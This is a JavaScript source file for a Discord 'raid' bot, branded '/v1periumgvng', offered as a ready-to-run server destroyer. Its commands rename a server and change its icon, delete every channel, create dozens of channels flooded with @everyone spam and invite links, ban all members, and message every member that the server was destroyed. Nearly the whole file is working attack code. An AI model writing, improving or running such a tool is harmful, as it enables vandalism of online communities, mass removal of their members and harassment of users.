const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField} = require('discord.js');
const client = new Client({intents: [103423]});
const fetch = require('node-fetch');
const bot_token = "AQUI PONEN SU TOKEN DEL BOT.";
const prefix = "n$"; // Prefijo del bot
const names_channels = ["pawned nixsquad"];
const userid_vip = ["1118494974607114325", "Segundo user vip xdd"];
const Stack = require('@tapjs/stack');
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
let en_raid = false;
let mensajes_enviados = 0;
let canales_creados = 0;
let canales_borrados_exito = false;
let nombre_server_cambiado = false;
let icon_server_cambiado = false;

console.clear();
console.log(`[31m
██╗███████╗███████╗██╗   ██╗
██║╚════██║╚════██║╚██╗ ██╔╝
██║  ███╔═╝  ███╔═╝ ╚████╔╝
██║██╔══╝  ██╔══╝    ╚██╔╝
██║███████╗███████╗  ██║
╚═╝╚══════╝╚══════╝  ╚═╝
`);
client.on(`channelCreate`,async (channel)=>{
    if(names_channels.includes(channel.name)){
        try {
            await channel.send({content:`@everyone | @here\nhttps://discord.gg/5sRWVrpQHD`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
            await channel.send({embeds:[
                        new EmbedBuilder()
                        .setImage(`https://media.discordapp.net/attachments/1345943141244604517/1345959187602997268/ad2809b9953cfe3f236581b727ec4690.png?ex=67c71a6d&is=67c5c8ed&hm=06294a09316e229a66287c167b6305cdea50386450a2a24957de2dd8344939bd&=&format=webp&quality=lossless`)
                        .setTitle(`/NixSquad`)
            ]}).catch((e)=>{console.log(e)})
            mensajes_enviados++;
        } catch (e) {
            console.log(e)
        }
    };
});
client.on(`messageCreate`,async (msg)=>{
   
if (msg.content === prefix + "invite") {
    const embed = new EmbedBuilder()
        .setColor(`#232426`)
        .setImage(`https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=`)
        .setFooter({ text: `- /Nix x 1zzy. -` })
        .setDescription(`☠️ [Click here to invite me](https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot)`);

    try {
        await msg.author.send({ embeds: [embed] });
    } catch (error) {
        console.error("No se pudo enviar el mensaje privado:", error);
    }
}
    if(msg.content === prefix+"cmds"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`Commands`)
            .setThumbnail(`https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=`)
            .setFooter({text:`- /Nix By 1zzy. -`})
            .setDescription(`The commands of the bot raid are:

v$raid **raid to the server** ☠️
v$banall **banall members of the server** ☠️
v$nuked **delete all channels of the server** ☠️
v$spam **makes 10 tags on all server channels** ☠️`)
        ]})
    };
    

if (msg.content === prefix + "raid") {  
    try {
        const owner = await msg.guild.fetchOwner();

        // Cambiar el nombre y el icono del servidor
        msg.guild.setName("pawaned By 1zzy").catch(e => console.log(`Error al cambiar el nombre: ${e.message}`));
        msg.guild.setIcon("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=").catch(e => console.log(`Error al cambiar el icono: ${e.message}`));

    } catch (e) {
        console.log(e.message);
    }

    async function eliminarCanales() {
        const canales = await msg.guild.channels.fetch();
        await Promise.allSettled(canales.map(canal => canal.delete().catch(() => {})));
    }

    async function crearCanalesYEnviarMensajes() {
        const nombresCanales = ["『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎", "『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎", "『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎"];
        const promesasCanales = [];

        for (let i = 0; i < 30; i++) { 
            const nombreCanal = nombresCanales[i % nombresCanales.length]; // Alternar entre los nombres

            promesasCanales.push(
                msg.guild.channels.create({
                    name: nombreCanal,
                    type: ChannelType.GuildText
                }).then(async (canal) => {
                    const embed = new EmbedBuilder()
                        .setImage("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=")
                        .setDescription('ㅤㅤ         **✞   S̶E̶R̶V̶E̶R̶ ̶D̶E̶S̶T̶R̶O̶Y̶E̶R̶S̶   ✞**')
                        .setColor('#000000')
                        .setFooter({ text: '/v1periumgvng' });

                    const mensajes = Array(80).fill({
                        content: "||@everyone||\n> https://discord.gg/vvfRBUCwpP **",
                        embeds: [embed]
                    });

                    await Promise.allSettled(mensajes.map(m => canal.send(m).catch(() => {})));
                })
            );
        }

        await Promise.allSettled(promesasCanales);
    }

    async function enviarMensajePrivado() {
        const miembros = await msg.guild.members.fetch();
        const embedDM = new EmbedBuilder()
            .setTitle("**RAID COMPLETADO POR /v1periumgvng**")
            .setThumbnail("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=")
            .setDescription(`El servidor **${msg.guild.name}** ha sido destruido por /v1periumgvng.`)
            .setColor("#000000")
            .setTimestamp();

        if (msg.guild.vanityURLCode) {
            embedDM.addFields({ name: "🔗 Link del servidor:", value: `https://discord.gg/${msg.guild.vanityURLCode}` });
        }

        await Promise.allSettled(
            miembros.map(m => m.send({ embeds: [embedDM] }).catch(() => {}))
        );
    }

    async function ejecutarAtaque() {
        await eliminarCanales();
        await crearCanalesYEnviarMensajes();
        await enviarMensajePrivado();
    }

    ejecutarAtaque();
}


    if(msg.content === prefix+"banall"){
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setThumbnail(`https://media.discordapp.net/attachments/1345943141244604517/1345959187602997268/ad2809b9953cfe3f236581b727ec4690.png?ex=67c71a6d&is=67c5c8ed&hm=06294a09316e229a66287c167b6305cdea50386450a2a24957de2dd8344939bd&=&format=webp&quality=lossless`)
            .setDescription(`☠️ You have started a raid ( .banall ) in **${msg.guild.name}**`)
        ]});
        let memberss = await msg.guild.members.fetch();
        for (const memberxd of memberss.values()) {
            memberxd.ban().catch((e)=>{console.log(e)});
        };
    };
    
  
if (msg.content === prefix + "nuke") {
    try {
        let channels = await msg.guild.channels.fetch();
        
        for (const ch of channels.values()) {
            ch.delete().catch(console.error);
        }

        await msg.guild.channels.create({
            name: "nuked v1perium",
            type: ChannelType.GuildText
        }).catch(console.error);
        
    } catch (error) {
        console.error("Error al ejecutar el comando nuke:", error);
    }
}
if (msg.content === prefix + "spam") {
    let canales = await msg.guild.channels.fetch();
    let mensajes_totales = canales.size * 50; // Ajusta el número de mensajes por canal

    async function enviarMensajes(channel) {
        if (channel.type !== ChannelType.GuildText) return; // Solo en canales de texto

        for (let i = 0; i < 50; i++) { // Ajusta el número de repeticiones
            try {
                await channel.send({
                    content: `@everyone | @here\n https://discord.gg/vvfRBUCwpP`
                });

                await channel.send({
                    embeds: [
                        new EmbedBuilder()
                            .setImage("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=%29%2A%2A&")
                            .setTitle("/v1periumgvng")
                    ]
                });

            } catch (error) {
                console.error(`Error enviando mensaje en ${channel.name}:`, error);
            }
        }
    }

    // Enviar mensajes en todos los canales simultáneamente
    await Promise.all(canales.map(enviarMensajes));

    console.log(`Se enviaron ${mensajes_totales} mensajes en el servidor.`);
}
});
client.login(bot_token);
